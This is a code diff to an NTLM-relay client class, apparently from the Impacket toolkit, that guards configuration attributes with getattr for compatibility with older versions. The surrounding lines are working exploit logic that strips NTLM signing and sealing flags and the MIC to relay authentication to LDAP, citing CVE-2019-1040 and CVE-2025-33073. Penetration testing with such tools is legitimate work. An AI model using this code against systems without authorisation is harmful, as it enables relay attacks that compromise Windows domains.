@@ -84,19 +84,22 @@ class LDAPRelayClient(ProtocolClient):
         # For SMB->LDAP this is required otherwise it triggers LDAP signing
         # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
         # CVE-2025-33073 also requires removing the sign flags
-        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
+        _remove_mic = getattr(self.serverConfig, 'remove_mic', False)
+        _remove_sign_seal = getattr(self.serverConfig, 'remove_sign_seal', False)
+
+        if _remove_mic or _remove_sign_seal:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
 
         # When exploiting CVE-2025-33073, remove SEAL in addition to SIGN/ALWAYS_SIGN.
-        if self.serverConfig.remove_sign_seal:
+        if _remove_sign_seal:
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
 
         # relaytrace: report exactly which negotiate flags we cleared
-        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
+        if _remove_mic or _remove_sign_seal:
             rt.signseal_stripped(negoMessageFlagsBefore, negoMessage['flags'])
 
         self.negotiateMessage = negoMessage.getData()
@@ -156,8 +159,12 @@ class LDAPRelayClient(ProtocolClient):
         except Exception:
             rt.info("AV-pair posture could not be parsed from the blob.")
 
+        # Version-proof: guard config attributes that may not exist on older Impacket
+        _remove_mic = getattr(self.serverConfig, 'remove_mic', False)
+        _remove_sign_seal = getattr(self.serverConfig, 'remove_sign_seal', False)
+
         # When exploiting CVE-2019-1040, remove flags
-        if self.serverConfig.remove_mic:
+        if _remove_mic:
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
@@ -172,7 +179,7 @@ class LDAPRelayClient(ProtocolClient):
             authMessage['VersionLen'] = 0
             token = authMessage.getData()
 
-        if self.serverConfig.remove_sign_seal:
+        if _remove_sign_seal:
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
